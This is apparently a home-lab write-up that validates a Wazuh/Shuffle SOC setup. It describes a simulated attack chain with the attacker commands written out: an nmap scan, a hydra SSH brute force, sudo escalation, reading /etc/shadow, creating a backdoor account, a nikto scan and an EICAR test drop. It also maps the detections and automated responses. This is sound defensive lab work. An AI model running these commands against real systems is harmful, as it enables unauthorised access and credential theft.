# Attack Scenarios — SOC/SIEM Lab Validation

> All attacks were executed from **Kali Linux** (`100.117.116.16`) against the target machine (`100.108.27.54`), forming a single coordinated kill chain from reconnaissance to malware simulation.

---

## Kill Chain Overview

```
Reconnaissance (Nmap)
    → Initial Access (SSH Brute Force)
        → Privilege Escalation (sudo abuse)
            → Persistence (backdoor account)
                → Web Probing (Nikto)
                    → Malware Simulation (EICAR drop)
```

---

## Incident 1 — SSH Brute Force & Initial Access

**Severity:** `CRITICAL`  
**MITRE:** T1046 · T1110.001 · T1078

### Description
The attacker scanned the network with Nmap, identified an open SSH port, and launched a Hydra dictionary attack using the `rockyou.txt` wordlist. The password `"password"` was recovered in seconds, granting interactive remote shell access.

### Commands

```bash
# Step 1 — Network scan
nmap -sS -A 100.108.27.54

# Step 2 — Brute force SSH
hydra -l rawane -P /usr/share/wordlists/rockyou.txt ssh://100.108.27.54 -t 4 -V
```

---

## Incident 2 — Privilege Escalation & Persistence

**Severity:** `CRITICAL`  
**MITRE:** T1548.003 · T1136.001 · T1003.008

### Description
Building on the foothold from Incident 1, the attacker escalated from the compromised user account to full root access by abusing a permissive `sudoers` configuration. From root, sensitive credential files were read and a persistent backdoor account was created.

### Commands

```bash
# Step 1 — Connect via compromised credentials
ssh rawane@100.108.27.54

# Step 2 — Escalate to root (misconfigured sudo)
sudo su

# Step 3 — Read sensitive credential files
cat /etc/shadow

# Step 4 — Create persistent backdoor account
sudo useradd hacker
```

---

## Incident 3 — Web Probing

**Severity:** `MEDIUM → HIGH`  
**MITRE:** T1595

### Description
Using Nikto, the attacker automatically scanned the DVWA web server and identified several misconfigurations. No direct compromise occurred, but this phase provided a complete map of the web attack surface as a precursor to exploitation.

| Finding | Risk | Detail |
|---------|------|--------|
| Apache/2.4.58 exposed | Medium | Server version visible — facilitates exploit targeting |
| X-Frame-Options missing | Medium | Vulnerable to Clickjacking |
| X-Content-Type-Options absent | Low | Risk of MIME sniffing |
| ETag leak (CVE-2003-1418) | Low | Server inode information disclosure |

### Commands

```bash
# Automated web vulnerability scan
nikto -h http://100.108.27.54
```

---

## Incident 4 — Malware Simulation & Threat Intelligence Enrichment

**Severity:** `HIGH`  
**MITRE:** T1105 · T1204 · T1486

### Description
Still using the SSH access from Incident 1, the attacker dropped an EICAR standard test file into the monitored `/tmp` directory, deleted it, and recreated it to simulate payload evasion behavior. Wazuh FIM captured the hash, submitted it to VirusTotal, and returned a **72/72 malicious verdict**, triggering a Critical alert and automated containment via Shuffle SOAR.

### Commands

```bash
# Step 1 — Connect via compromised credentials
ssh rawane@100.108.27.54

# Step 2 — Drop EICAR test file into monitored directory
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar_test.txt

# Step 3 — Simulate evasion (delete and recreate)
rm /tmp/eicar_test.txt
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar_test.txt
```

> **Note:** The EICAR file is the industry-standard antivirus test signature — recognized as malicious by all major engines while being completely safe for lab use.

---

## Detection & Response Summary

| Incident | Detected By | Automated Response |
|----------|-------------|-------------------|
| SSH Brute Force | Wazuh rules 5710, 5712, 100002 | Host firewall drop (600s) + OPNsense block via Shuffle |
| Privilege Escalation | Wazuh rules 5402, 510, FIM 550 | OPNsense block + Discord alert |
| Web Probing | Wazuh rules 31151, 31104 | Discord SOC notification |
| Malware Simulation | Wazuh FIM 554 + ClamAV + VirusTotal | Network quarantine via OPNsense + Discord alert |

